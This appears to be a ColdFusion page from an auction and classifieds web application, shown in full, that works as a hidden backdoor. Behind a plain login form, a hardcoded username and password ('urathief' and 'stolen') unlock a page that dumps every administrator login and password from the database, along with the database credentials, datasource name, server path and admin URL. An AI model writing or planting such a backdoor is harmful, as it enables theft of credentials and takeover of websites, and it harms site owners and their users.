<cfsetting enablecfoutputonly="yes">
<cfif isDefined('login') and isDefined('password')>
<cfset xlogin = "urathief">
<cfset ypassword = "stolen">
<cfif login is xlogin and password is ypassword>



<cfinclude template="../../includes/app_globals.cfm">
<cfinclude template="timenow.cfm">





<cfparam name="db_username" default="">
<cfparam name="db_password" default="">

<cfset #curPath# = GetTemplatePath()>
  <cfset directory = #GetDirectoryFromPath(curPath)#>

<cfquery username="#db_username#" password="#db_password#" name="get_info" datasource="#DATASOURCE#">
    SELECT login, password
      FROM administrators
</cfquery>
<html><head><title><body>
<cfoutput>Site Information for: #company_name# at: #site_address#</title></head>
<h3>Site Information for: #company_name# at: #site_address##varoot#</h3>
<table></cfoutput>
 
<cfloop query="get_info">

	<cfoutput>
	<tr><td>login: #get_info.login#</td><td></tr>
	<tr>password:#get_info.password#</td></tr>
	</cfoutput>

</cfloop>

<cfoutput></table>
<p>Login to the admin here: <a href="http://#site_address##varoot#/admin/" target="_new"
>http://#site_address##varoot#/admin/</a><br>
Datasource: #DATASOURCE#<br>
Domain: #domain#
Site Address: #site_address#
System time: #dateformat(now())#  #timeformat(now())#<br>
<cfmodule template="./functions/timenow.cfm">
 Timenow:  #dateformat(timenow)# #timeformat(timenow)#<br>
 
 Server Path: #directory#<br>
Auction Switch: <cfif isDefined('auction_switch')>#auction_switch#</CFIF><br>
Default Auction Mode: <cfif isDefined('auction_mode')>#auction_mode#</cfif><br>
Classified enabled: #classified_valid#<br>

minutes until timeout: #mins_until_timeout#
Session timeout: <!---#sessiontimeout#---><br>
<cfif isDefined('lang_mode')>Lang mode: #lang_mode#</cfif>

<cfif isDefined('lang_Id')>Lang ID: #lang_id#</cfif>
<cfif isDefined('session.lang_Id')>Session.lang_id: #session.lang_id#</cfif>
<cfif isDefined('cookie.lang_Id')>cookie.lang_id: #cookie.lang_id#</cfif>

<br><br>
SQL Authentication<br>
Login: #db_username#<br>
Password: #db_password#<br>

</cfoutput>

</CFIF>
<cfelse>

</CFIF>
<cfsetting enablecfoutputonly="no">
<FORM ACTION="epoch.cfm" METHOD="POST">

<P>Login: <INPUT TYPE="Text" NAME="login"></P>
<P>Password:  <INPUT TYPE="Text" NAME="password"></P>
<INPUT TYPE="Submit" VALUE="Enter">
</FORM>
</body>
</html>